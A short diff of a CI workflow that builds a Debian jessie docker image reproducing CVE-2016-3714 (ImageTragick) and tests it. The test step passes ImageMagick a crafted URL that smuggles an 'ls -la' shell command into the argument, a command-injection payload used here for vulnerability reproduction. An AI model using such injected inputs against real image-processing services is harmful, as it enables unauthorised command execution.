@@ -25,11 +25,11 @@ jobs:
           python -m pip install --upgrade pip
           pip install -r requirements.txt
 
-    - name: Create and build docker (CVE-2016-3714)
+    - name: Build docker (CVE-2016-3714)
       run: python3 decret.py -r jessie -n 2016-3714 -s --dont-run
 
     - name: Test vuln (CVE-2016-3714)
       run: |
-        docker run jessie/cve-2016-3714 apt-get install curl wget
+        docker run jessie/cve-2016-3714 apt-get install curl wget -y
         docker run jessie/cve-2016-3714 convert 'https://example.com";ls "-la' out.png
         
